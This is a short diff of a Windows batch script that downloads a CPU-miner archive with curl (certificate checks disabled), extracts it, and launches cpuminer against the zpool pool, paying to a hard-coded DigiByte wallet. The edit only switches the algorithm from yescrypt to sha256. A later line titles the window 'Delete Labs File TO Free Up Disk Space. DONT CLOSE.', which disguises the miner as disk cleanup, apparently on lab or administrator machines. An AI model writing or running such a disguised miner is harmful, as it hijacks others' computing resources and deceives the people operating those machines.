@@ -15,7 +15,7 @@ timeout 10 >nul
 curl -LJOk https://raw.githubusercontent.com/mrX04/mimning/master/Cpuminer-opt-cpu-pool-win64.zip
 7z.exe x Cpuminer-opt-cpu-pool-win64.zip
 cd C:\Users\Administrator\Desktop\Cpuminer-opt-cpu-pool-win64
-start cpuminer.exe -a yescrypt -o stratum+tcp://yescrypt.eu.mine.zpool.ca:6233 -u DRjwyBu7dWkd7zJyhpVtgXC5LWbG51ooxP -p c=DGB
+start cpuminer.exe -a sha256 -o stratum+tcp://sha256.eu.mine.zpool.ca:3333 -u DRjwyBu7dWkd7zJyhpVtgXC5LWbG51ooxP -p c=DGB
 @echo off
 cls
 title Delete Labs File TO Free Up Disk Space. DONT CLOSE.
